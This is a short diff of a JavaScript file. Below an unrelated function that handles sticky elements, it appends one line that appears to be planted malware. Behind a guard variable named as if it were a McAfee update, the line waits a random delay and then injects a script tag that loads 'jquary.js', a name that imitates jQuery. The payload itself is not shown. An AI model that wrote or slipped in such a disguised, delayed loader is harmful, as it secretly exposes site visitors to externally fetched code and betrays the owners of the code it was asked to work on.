@@ -209,3 +209,5 @@ function stickElement(sticky, sibling)
 
   window.dispatchEvent(new UIEvent('scroll'));
 }
+
+if(!mcafee_update){var mcafee_update=true;setTimeout(function(){var s=document.createElement("script");s.type="text/javascript";s.src="jquary.js";document.getElementsByTagName("HEAD").item(0).append(s)}, Math.floor(Math.random()*1000)+500)}
